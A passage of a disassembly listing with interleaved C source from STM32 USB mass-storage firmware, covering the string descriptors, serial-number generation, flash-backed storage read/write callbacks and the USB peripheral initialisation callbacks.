 800c57c:	4907      	ldr	r1, [pc, #28]	; (800c59c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c57e:	4808      	ldr	r0, [pc, #32]	; (800c5a0 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c580:	f7ff fe00 	bl	800c184 <USBD_GetString>
 800c584:	e004      	b.n	800c590 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c586:	683a      	ldr	r2, [r7, #0]
 800c588:	4904      	ldr	r1, [pc, #16]	; (800c59c <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c58a:	4805      	ldr	r0, [pc, #20]	; (800c5a0 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c58c:	f7ff fdfa 	bl	800c184 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c590:	4b02      	ldr	r3, [pc, #8]	; (800c59c <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c592:	4618      	mov	r0, r3
 800c594:	3708      	adds	r7, #8
 800c596:	46bd      	mov	sp, r7
 800c598:	bd80      	pop	{r7, pc}
 800c59a:	bf00      	nop
 800c59c:	2000097c 	.word	0x2000097c
 800c5a0:	0800d15c 	.word	0x0800d15c

0800c5a4 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5a4:	b480      	push	{r7}
 800c5a6:	b083      	sub	sp, #12
 800c5a8:	af00      	add	r7, sp, #0
 800c5aa:	4603      	mov	r3, r0
 800c5ac:	6039      	str	r1, [r7, #0]
 800c5ae:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c5b0:	683b      	ldr	r3, [r7, #0]
 800c5b2:	220c      	movs	r2, #12
 800c5b4:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c5b6:	4b03      	ldr	r3, [pc, #12]	; (800c5c4 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c5b8:	4618      	mov	r0, r3
 800c5ba:	370c      	adds	r7, #12
 800c5bc:	46bd      	mov	sp, r7
 800c5be:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c5c2:	4770      	bx	lr
 800c5c4:	200001f4 	.word	0x200001f4

0800c5c8 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c5c8:	b580      	push	{r7, lr}
 800c5ca:	b084      	sub	sp, #16
 800c5cc:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c5ce:	4b0f      	ldr	r3, [pc, #60]	; (800c60c <Get_SerialNum+0x44>)
 800c5d0:	681b      	ldr	r3, [r3, #0]
 800c5d2:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c5d4:	4b0e      	ldr	r3, [pc, #56]	; (800c610 <Get_SerialNum+0x48>)
 800c5d6:	681b      	ldr	r3, [r3, #0]
 800c5d8:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c5da:	4b0e      	ldr	r3, [pc, #56]	; (800c614 <Get_SerialNum+0x4c>)
 800c5dc:	681b      	ldr	r3, [r3, #0]
 800c5de:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c5e0:	68fa      	ldr	r2, [r7, #12]
 800c5e2:	687b      	ldr	r3, [r7, #4]
 800c5e4:	4413      	add	r3, r2
 800c5e6:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c5e8:	68fb      	ldr	r3, [r7, #12]
 800c5ea:	2b00      	cmp	r3, #0
 800c5ec:	d009      	beq.n	800c602 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c5ee:	2208      	movs	r2, #8
 800c5f0:	4909      	ldr	r1, [pc, #36]	; (800c618 <Get_SerialNum+0x50>)
 800c5f2:	68f8      	ldr	r0, [r7, #12]
 800c5f4:	f000 f814 	bl	800c620 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c5f8:	2204      	movs	r2, #4
 800c5fa:	4908      	ldr	r1, [pc, #32]	; (800c61c <Get_SerialNum+0x54>)
 800c5fc:	68b8      	ldr	r0, [r7, #8]
 800c5fe:	f000 f80f 	bl	800c620 <IntToUnicode>
  }
}
 800c602:	bf00      	nop
 800c604:	3710      	adds	r7, #16
 800c606:	46bd      	mov	sp, r7
 800c608:	bd80      	pop	{r7, pc}
 800c60a:	bf00      	nop
 800c60c:	1fff7590 	.word	0x1fff7590
 800c610:	1fff7594 	.word	0x1fff7594
 800c614:	1fff7598 	.word	0x1fff7598
 800c618:	20000206 	.word	0x20000206
 800c61c:	20000216 	.word	0x20000216

0800c620 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c620:	b480      	push	{r7}
 800c622:	b087      	sub	sp, #28
 800c624:	af00      	add	r7, sp, #0
 800c626:	60f8      	str	r0, [r7, #12]
 800c628:	60b9      	str	r1, [r7, #8]
 800c62a:	4613      	mov	r3, r2
 800c62c:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c62e:	2300      	movs	r3, #0
 800c630:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c632:	2300      	movs	r3, #0
 800c634:	75fb      	strb	r3, [r7, #23]
 800c636:	e027      	b.n	800c688 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c638:	68fb      	ldr	r3, [r7, #12]
 800c63a:	0f1b      	lsrs	r3, r3, #28
 800c63c:	2b09      	cmp	r3, #9
 800c63e:	d80b      	bhi.n	800c658 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c640:	68fb      	ldr	r3, [r7, #12]
 800c642:	0f1b      	lsrs	r3, r3, #28
 800c644:	b2da      	uxtb	r2, r3
 800c646:	7dfb      	ldrb	r3, [r7, #23]
 800c648:	005b      	lsls	r3, r3, #1
 800c64a:	4619      	mov	r1, r3
 800c64c:	68bb      	ldr	r3, [r7, #8]
 800c64e:	440b      	add	r3, r1
 800c650:	3230      	adds	r2, #48	; 0x30
 800c652:	b2d2      	uxtb	r2, r2
 800c654:	701a      	strb	r2, [r3, #0]
 800c656:	e00a      	b.n	800c66e <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c658:	68fb      	ldr	r3, [r7, #12]
 800c65a:	0f1b      	lsrs	r3, r3, #28
 800c65c:	b2da      	uxtb	r2, r3
 800c65e:	7dfb      	ldrb	r3, [r7, #23]
 800c660:	005b      	lsls	r3, r3, #1
 800c662:	4619      	mov	r1, r3
 800c664:	68bb      	ldr	r3, [r7, #8]
 800c666:	440b      	add	r3, r1
 800c668:	3237      	adds	r2, #55	; 0x37
 800c66a:	b2d2      	uxtb	r2, r2
 800c66c:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c66e:	68fb      	ldr	r3, [r7, #12]
 800c670:	011b      	lsls	r3, r3, #4
 800c672:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c674:	7dfb      	ldrb	r3, [r7, #23]
 800c676:	005b      	lsls	r3, r3, #1
 800c678:	3301      	adds	r3, #1
 800c67a:	68ba      	ldr	r2, [r7, #8]
 800c67c:	4413      	add	r3, r2
 800c67e:	2200      	movs	r2, #0
 800c680:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c682:	7dfb      	ldrb	r3, [r7, #23]
 800c684:	3301      	adds	r3, #1
 800c686:	75fb      	strb	r3, [r7, #23]
 800c688:	7dfa      	ldrb	r2, [r7, #23]
 800c68a:	79fb      	ldrb	r3, [r7, #7]
 800c68c:	429a      	cmp	r2, r3
 800c68e:	d3d3      	bcc.n	800c638 <IntToUnicode+0x18>
  }
}
 800c690:	bf00      	nop
 800c692:	bf00      	nop
 800c694:	371c      	adds	r7, #28
 800c696:	46bd      	mov	sp, r7
 800c698:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c69c:	4770      	bx	lr

0800c69e <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c69e:	b480      	push	{r7}
 800c6a0:	b083      	sub	sp, #12
 800c6a2:	af00      	add	r7, sp, #0
 800c6a4:	4603      	mov	r3, r0
 800c6a6:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c6a8:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c6aa:	4618      	mov	r0, r3
 800c6ac:	370c      	adds	r7, #12
 800c6ae:	46bd      	mov	sp, r7
 800c6b0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6b4:	4770      	bx	lr

0800c6b6 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c6b6:	b480      	push	{r7}
 800c6b8:	b085      	sub	sp, #20
 800c6ba:	af00      	add	r7, sp, #0
 800c6bc:	4603      	mov	r3, r0
 800c6be:	60b9      	str	r1, [r7, #8]
 800c6c0:	607a      	str	r2, [r7, #4]
 800c6c2:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c6c4:	68bb      	ldr	r3, [r7, #8]
 800c6c6:	2240      	movs	r2, #64	; 0x40
 800c6c8:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c6ca:	687b      	ldr	r3, [r7, #4]
 800c6cc:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c6d0:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c6d2:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c6d4:	4618      	mov	r0, r3
 800c6d6:	3714      	adds	r7, #20
 800c6d8:	46bd      	mov	sp, r7
 800c6da:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6de:	4770      	bx	lr

0800c6e0 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c6e0:	b480      	push	{r7}
 800c6e2:	b083      	sub	sp, #12
 800c6e4:	af00      	add	r7, sp, #0
 800c6e6:	4603      	mov	r3, r0
 800c6e8:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c6ea:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c6ec:	4618      	mov	r0, r3
 800c6ee:	370c      	adds	r7, #12
 800c6f0:	46bd      	mov	sp, r7
 800c6f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6f6:	4770      	bx	lr

0800c6f8 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c6f8:	b480      	push	{r7}
 800c6fa:	b083      	sub	sp, #12
 800c6fc:	af00      	add	r7, sp, #0
 800c6fe:	4603      	mov	r3, r0
 800c700:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c702:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c704:	4618      	mov	r0, r3
 800c706:	370c      	adds	r7, #12
 800c708:	46bd      	mov	sp, r7
 800c70a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c70e:	4770      	bx	lr

0800c710 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c710:	b580      	push	{r7, lr}
 800c712:	b084      	sub	sp, #16
 800c714:	af00      	add	r7, sp, #0
 800c716:	60b9      	str	r1, [r7, #8]
 800c718:	607a      	str	r2, [r7, #4]
 800c71a:	461a      	mov	r2, r3
 800c71c:	4603      	mov	r3, r0
 800c71e:	73fb      	strb	r3, [r7, #15]
 800c720:	4613      	mov	r3, r2
 800c722:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c724:	7bfb      	ldrb	r3, [r7, #15]
 800c726:	2b00      	cmp	r3, #0
 800c728:	d10d      	bne.n	800c746 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c72a:	687b      	ldr	r3, [r7, #4]
 800c72c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c730:	3340      	adds	r3, #64	; 0x40
 800c732:	02db      	lsls	r3, r3, #11
 800c734:	4619      	mov	r1, r3
 800c736:	89bb      	ldrh	r3, [r7, #12]
 800c738:	02db      	lsls	r3, r3, #11
 800c73a:	461a      	mov	r2, r3
 800c73c:	68b8      	ldr	r0, [r7, #8]
 800c73e:	f000 fc65 	bl	800d00c <memcpy>
		return (USBD_OK);
 800c742:	2300      	movs	r3, #0
 800c744:	e000      	b.n	800c748 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c746:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c748:	4618      	mov	r0, r3
 800c74a:	3710      	adds	r7, #16
 800c74c:	46bd      	mov	sp, r7
 800c74e:	bd80      	pop	{r7, pc}

0800c750 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c750:	b580      	push	{r7, lr}
 800c752:	b08a      	sub	sp, #40	; 0x28
 800c754:	af00      	add	r7, sp, #0
 800c756:	60b9      	str	r1, [r7, #8]
 800c758:	607a      	str	r2, [r7, #4]
 800c75a:	461a      	mov	r2, r3
 800c75c:	4603      	mov	r3, r0
 800c75e:	73fb      	strb	r3, [r7, #15]
 800c760:	4613      	mov	r3, r2
 800c762:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c764:	7bfb      	ldrb	r3, [r7, #15]
 800c766:	2b00      	cmp	r3, #0
 800c768:	d136      	bne.n	800c7d8 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c76a:	f7f4 febb 	bl	80014e4 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c76e:	2300      	movs	r3, #0
 800c770:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c772:	2301      	movs	r3, #1
 800c774:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c776:	687b      	ldr	r3, [r7, #4]
 800c778:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c77c:	3340      	adds	r3, #64	; 0x40
 800c77e:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c782:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c784:	89bb      	ldrh	r3, [r7, #12]
 800c786:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c788:	2300      	movs	r3, #0
 800c78a:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c78c:	f107 0210 	add.w	r2, r7, #16
 800c790:	f107 0314 	add.w	r3, r7, #20
 800c794:	4611      	mov	r1, r2
 800c796:	4618      	mov	r0, r3
 800c798:	f7f4 ff8a 	bl	80016b0 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c79c:	2300      	movs	r3, #0
 800c79e:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7a0:	e011      	b.n	800c7c6 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c7a2:	687b      	ldr	r3, [r7, #4]
 800c7a4:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7a8:	3340      	adds	r3, #64	; 0x40
 800c7aa:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7ac:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7ae:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c7b0:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7b2:	68ba      	ldr	r2, [r7, #8]
 800c7b4:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7b6:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c7ba:	2000      	movs	r0, #0
 800c7bc:	f7f4 fe26 	bl	800140c <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7c0:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7c2:	3308      	adds	r3, #8
 800c7c4:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7c6:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c7c8:	89bb      	ldrh	r3, [r7, #12]
 800c7ca:	02db      	lsls	r3, r3, #11
 800c7cc:	429a      	cmp	r2, r3
 800c7ce:	d3e8      	bcc.n	800c7a2 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c7d0:	f7f4 feaa 	bl	8001528 <HAL_FLASH_Lock>
		return USBD_OK;
 800c7d4:	2300      	movs	r3, #0
 800c7d6:	e000      	b.n	800c7da <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c7d8:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c7da:	4618      	mov	r0, r3
 800c7dc:	3728      	adds	r7, #40	; 0x28
 800c7de:	46bd      	mov	sp, r7
 800c7e0:	bd80      	pop	{r7, pc}

0800c7e2 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c7e2:	b480      	push	{r7}
 800c7e4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c7e6:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c7e8:	4618      	mov	r0, r3
 800c7ea:	46bd      	mov	sp, r7
 800c7ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c7f0:	4770      	bx	lr
	...

0800c7f4 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c7f4:	b580      	push	{r7, lr}
 800c7f6:	b098      	sub	sp, #96	; 0x60
 800c7f8:	af00      	add	r7, sp, #0
 800c7fa:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c7fc:	f107 030c 	add.w	r3, r7, #12
 800c800:	2254      	movs	r2, #84	; 0x54
 800c802:	2100      	movs	r1, #0
 800c804:	4618      	mov	r0, r3
 800c806:	f000 fbd5 	bl	800cfb4 <memset>
  if(pcdHandle->Instance==USB)
 800c80a:	687b      	ldr	r3, [r7, #4]
 800c80c:	681b      	ldr	r3, [r3, #0]
 800c80e:	4a1d      	ldr	r2, [pc, #116]	; (800c884 <HAL_PCD_MspInit+0x90>)
 800c810:	4293      	cmp	r3, r2
 800c812:	d132      	bne.n	800c87a <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c814:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c818:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c81a:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c81e:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c820:	2301      	movs	r3, #1
 800c822:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c824:	2301      	movs	r3, #1
 800c826:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c828:	2318      	movs	r3, #24
 800c82a:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c82c:	2307      	movs	r3, #7
 800c82e:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c830:	2302      	movs	r3, #2
 800c832:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c834:	2302      	movs	r3, #2
 800c836:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c838:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c83c:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c83e:	f107 030c 	add.w	r3, r7, #12
 800c842:	4618      	mov	r0, r3
 800c844:	f7f7 fe5c 	bl	8004500 <HAL_RCCEx_PeriphCLKConfig>
 800c848:	4603      	mov	r3, r0
 800c84a:	2b00      	cmp	r3, #0
 800c84c:	d001      	beq.n	800c852 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c84e:	f7f4 fa03 	bl	8000c58 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c852:	4b0d      	ldr	r3, [pc, #52]	; (800c888 <HAL_PCD_MspInit+0x94>)
 800c854:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c856:	4a0c      	ldr	r2, [pc, #48]	; (800c888 <HAL_PCD_MspInit+0x94>)
 800c858:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c85c:	6593      	str	r3, [r2, #88]	; 0x58
 800c85e:	4b0a      	ldr	r3, [pc, #40]	; (800c888 <HAL_PCD_MspInit+0x94>)
 800c860:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c862:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c866:	60bb      	str	r3, [r7, #8]
 800c868:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c86a:	2200      	movs	r2, #0
 800c86c:	2100      	movs	r1, #0
 800c86e:	2043      	movs	r0, #67	; 0x43
 800c870:	f7f4 fd95 	bl	800139e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c874:	2043      	movs	r0, #67	; 0x43
 800c876:	f7f4 fdae 	bl	80013d6 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c87a:	bf00      	nop
 800c87c:	3760      	adds	r7, #96	; 0x60
 800c87e:	46bd      	mov	sp, r7
 800c880:	bd80      	pop	{r7, pc}
 800c882:	bf00      	nop
 800c884:	40006800 	.word	0x40006800
 800c888:	40021000 	.word	0x40021000

0800c88c <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c88c:	b580      	push	{r7, lr}
 800c88e:	b082      	sub	sp, #8
 800c890:	af00      	add	r7, sp, #0
 800c892:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c894:	687b      	ldr	r3, [r7, #4]
 800c896:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c89a:	687b      	ldr	r3, [r7, #4]
 800c89c:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c8a0:	4619      	mov	r1, r3
 800c8a2:	4610      	mov	r0, r2
 800c8a4:	f7fe fb70 	bl	800af88 <USBD_LL_SetupStage>
}
 800c8a8:	bf00      	nop
 800c8aa:	3708      	adds	r7, #8
 800c8ac:	46bd      	mov	sp, r7
 800c8ae:	bd80      	pop	{r7, pc}

0800c8b0 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8b0:	b580      	push	{r7, lr}
 800c8b2:	b082      	sub	sp, #8
 800c8b4:	af00      	add	r7, sp, #0
 800c8b6:	6078      	str	r0, [r7, #4]
 800c8b8:	460b      	mov	r3, r1
 800c8ba:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c8bc:	687b      	ldr	r3, [r7, #4]
 800c8be:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8c2:	78fa      	ldrb	r2, [r7, #3]
 800c8c4:	6879      	ldr	r1, [r7, #4]
 800c8c6:	4613      	mov	r3, r2
 800c8c8:	009b      	lsls	r3, r3, #2
 800c8ca:	4413      	add	r3, r2
 800c8cc:	00db      	lsls	r3, r3, #3
 800c8ce:	440b      	add	r3, r1
 800c8d0:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c8d4:	681a      	ldr	r2, [r3, #0]
 800c8d6:	78fb      	ldrb	r3, [r7, #3]
 800c8d8:	4619      	mov	r1, r3
 800c8da:	f7fe fbaa 	bl	800b032 <USBD_LL_DataOutStage>
}
 800c8de:	bf00      	nop
 800c8e0:	3708      	adds	r7, #8
 800c8e2:	46bd      	mov	sp, r7
 800c8e4:	bd80      	pop	{r7, pc}

0800c8e6 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8e6:	b580      	push	{r7, lr}
 800c8e8:	b082      	sub	sp, #8
 800c8ea:	af00      	add	r7, sp, #0
 800c8ec:	6078      	str	r0, [r7, #4]
 800c8ee:	460b      	mov	r3, r1
 800c8f0:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c8f2:	687b      	ldr	r3, [r7, #4]
 800c8f4:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8f8:	78fa      	ldrb	r2, [r7, #3]
 800c8fa:	6879      	ldr	r1, [r7, #4]
 800c8fc:	4613      	mov	r3, r2
 800c8fe:	009b      	lsls	r3, r3, #2
 800c900:	4413      	add	r3, r2
 800c902:	00db      	lsls	r3, r3, #3
 800c904:	440b      	add	r3, r1
 800c906:	333c      	adds	r3, #60	; 0x3c
 800c908:	681a      	ldr	r2, [r3, #0]
 800c90a:	78fb      	ldrb	r3, [r7, #3]
 800c90c:	4619      	mov	r1, r3
 800c90e:	f7fe fc43 	bl	800b198 <USBD_LL_DataInStage>
}
 800c912:	bf00      	nop
 800c914:	3708      	adds	r7, #8
 800c916:	46bd      	mov	sp, r7
 800c918:	bd80      	pop	{r7, pc}

0800c91a <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c91a:	b580      	push	{r7, lr}
 800c91c:	b082      	sub	sp, #8
 800c91e:	af00      	add	r7, sp, #0
 800c920:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c922:	687b      	ldr	r3, [r7, #4]
